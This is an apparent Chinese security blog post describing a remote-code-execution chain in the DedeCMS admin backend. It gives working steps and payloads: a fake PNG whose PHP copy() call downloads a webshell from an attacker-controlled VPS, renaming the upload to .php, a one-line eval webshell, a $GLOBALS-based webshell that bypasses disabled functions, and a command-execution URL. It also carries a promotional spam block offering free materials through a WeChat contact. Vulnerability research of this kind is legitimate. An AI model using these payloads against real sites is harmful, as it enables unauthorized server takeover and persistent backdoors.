## 前言

刚发现Dedecms更新了发布版本，顺便测试一下之前的day有没有修复，突然想到了新的tricks去实现RCE。

文章发布的时候估计比较晚了，一直没时间写了。

## 利用

    
    
    /uploads/dede/article_string_mix.php  
    /uploads/dede/article_template_rand.php  
    /uploads/dede/sys_task.php  
    ......

`我发布的文档->>>>添加文档->>>>站内选择进行文件上传`

    
    
    /uploads/dede/content_list.php](http://dedecms.xyz:8066/uploads/dede/content_list.php?mid=1)  
    /uploads/dede/catalog_do.php?channelid=0&cid=0&dopost=addArchives

![image-20230728094845280](https://image.3001.net/images/20230814/1691998407_64d9d8c78e2756ce96273.png!small)

文件上传

![image-20230728094856782](https://image.3001.net/images/20230814/1691998408_64d9d8c8f0b98879634fd.png!small)

在vps上起一个http的服务，端口设置为8016

![image-20230728094909452](https://image.3001.net/images/20230814/1691998410_64d9d8ca864d013395d3e.png!small)

远程服务器存放shell.php，文件内容为

    
    
    <?php @eval ($_POST ['a']);?>

准备一个图片格式的文件,文件内容为，这里我上传的文件名称为f.png

    
    
    <? copy("http://192.168.225.40:8016/shell.php","shell.php");?>

上传成功后可以看到上传的图片的位置

![img](https://image.3001.net/images/20230814/1691998411_64d9d8cb738b716d730c6.jpg!small)

修改文件名为`b.php`

![image-20230728095102010](https://image.3001.net/images/20230814/1691998412_64d9d8cc9d126fd93335a.png!small)

保存发现png图片已成功被更改，访问b.php,从远程vps下载了shell.php，当前目录下存在一个名称为shell.php的木马文件

![image-20230728095304075](https://image.3001.net/images/20230814/1691998413_64d9d8cdbd821bb16f503.png!small)

![image-20230728095321926](https://image.3001.net/images/20230814/1691998415_64d9d8cf36b924fe9b703.png!small)

利用webshell进行命令执行。

![image-20230728095349684](https://image.3001.net/images/20230814/1691998416_64d9d8d0b94fcfc5e77b0.png!small)

成功执行了命令

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

## 思考

如果不考虑文件上传后缀名绕过方法，仅以上面图片格式的文件上传的话，那么无所谓上传的什么内容，因为本身来讲dede的代码中对文件内容是做的有校验的

![image-20230728100238554](https://image.3001.net/images/20230814/1691998417_64d9d8d1d5038366b82f0.png!small)

所以文件内有两种绕过方法

  * 正则绕过

  * disable函数绕过

简单搜索了一下各个平台的文章，其实是有师傅正则绕过实现webshell的。第二点儿，disable函数绕过，往前几个版本，有兴趣的可以看一下源码，之前利用全局变量`Globals`绕过

![image-20230728101122230](https://image.3001.net/images/20230814/1691998418_64d9d8d2b56a7a10568a8.png!small)

代码内容

    
    
    <?php  
    $a = $GLOBALS["_GET"];  
    $b = $GLOBALS["_GET"];  
    $a['test1']($b['test2'])  
    ?>

![image-20230728101156144](https://image.3001.net/images/20230814/1691998419_64d9d8d3ca7801b3ca1f7.png!small)

命令执行

[http://dedecms.org:8016/uploads/shell.php?test1=assert&&test2=system(%22ipconfig%22);](http://dedecms.org:8016/uploads/shell.php?test1=assert&&test2=system\(%22ipconfig%22\);)

![image-20230728102212211](https://image.3001.net/images/20230814/1691998421_64d9d8d5020c3192021d7.png!small)

成功执行命令,且该命令执行为未授权命令执行。

所以在官方前几个版本中已经更新了，添加进了禁用方法

![image-20230728101530314](https://image.3001.net/images/20230814/1691998422_64d9d8d690b0fcf6d5d2d.png!small)

所以在绕过禁用方法上来讲更容易一点儿。所以在利用上这里利用了`copy`函数的特性，那么这里提醒一下，其它的函数当然也可以满足效果。

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

